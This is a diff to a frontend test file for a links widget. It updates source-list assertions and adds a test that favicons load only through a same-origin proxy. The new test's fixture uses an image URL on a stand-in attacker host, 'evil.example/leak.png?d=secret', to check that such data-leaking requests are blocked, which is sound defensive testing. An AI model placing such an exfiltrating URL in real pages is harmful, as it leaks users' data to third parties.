@@ -42,12 +42,12 @@ describe('LinksWidget', () => {
 		await expect.element(unsafe.getByText('Could not render sources').first()).toBeInTheDocument();
 	});
 
-	it('renders numbered cards, drops duplicates and unsafe URLs, and degrades missing fields', async () => {
+	it('renders a numbered sources line, drops duplicates and unsafe URLs, and degrades missing fields', async () => {
 		const screen = render(LinksWidget, { code: payload, isIncomplete: false });
-		await expect.element(screen.getByText('2 sources')).toBeInTheDocument();
+		await expect.element(screen.getByRole('region', { name: 'Sources' })).toBeInTheDocument();
 		const links = screen.getByRole('link');
 		expect(links.elements()).toHaveLength(2);
-		// Site suffix and section crumb are stripped from the title; site name, number and summary are shown.
+		// Site suffix and section crumb are stripped from the title; number, title, site and summary are announced.
 		const mdn = screen.getByRole('link', {
 			name: '1. CSS container queries, MDN Web Docs (developer.mozilla.org)'
 		});
@@ -58,7 +58,7 @@ describe('LinksWidget', () => {
 		await expect
 			.element(mdn)
 			.toHaveAccessibleDescription('Cascading Style Sheets is a stylesheet language.');
-		// No site name: the hostname stands in, and a monogram replaces the missing favicon.
+		// No site name: the hostname stands in, and a monogram replaces the favicon that can't load.
 		await expect
 			.element(screen.getByRole('link', { name: '2. Example post, example.com' }))
 			.toBeInTheDocument();
@@ -71,14 +71,39 @@ describe('LinksWidget', () => {
 			title: `Page ${i}`
 		}));
 		const screen = render(LinksWidget, { code: JSON.stringify({ links }), isIncomplete: false });
-		await expect.element(screen.getByText('12 of 14 sources')).toBeInTheDocument();
+		await expect.element(screen.getByText('+2 more')).toBeInTheDocument();
 		expect(screen.getByRole('link').elements()).toHaveLength(12);
+	});
+
+	it('loads remote favicons through the same-origin proxy, never directly', async () => {
+		const code = JSON.stringify({
+			links: [
+				{
+					url: 'https://www.thalia.example/book',
+					title: 'A book',
+					favicon: 'https://evil.example/leak.png?d=secret'
+				},
+				{ url: 'https://dictionary.cambridge.example/word', title: 'A word' }
+			]
+		});
+		const screen = render(LinksWidget, { code, isIncomplete: false });
+		const srcs = [...screen.container.querySelectorAll('img')].map((img) =>
+			img.getAttribute('src')
+		);
+		expect(srcs).toEqual([
+			'/api/favicon?host=thalia.example',
+			'/api/favicon?host=dictionary.cambridge.example'
+		]);
+		const img = screen.container.querySelector('img')!;
+		expect(img.getAttribute('loading')).toBe('lazy');
+		expect(img.getAttribute('referrerpolicy')).toBe('no-referrer');
 	});
 
 	it('falls back to a monogram when a favicon fails to load', async () => {
 		const screen = render(LinksWidget, { code: payload, isIncomplete: false });
-		// The MDN fixture's favicon is a broken image.
+		// The MDN fixture's favicon is a broken image, and the test server has no /api/favicon.
 		await expect.element(screen.getByText('M', { exact: true })).toBeInTheDocument();
+		await expect.element(screen.getByText('e', { exact: true })).toBeInTheDocument();
 		const img = screen.container.querySelector('img[referrerpolicy="no-referrer"]');
 		expect(img).toBeNull();
 	});
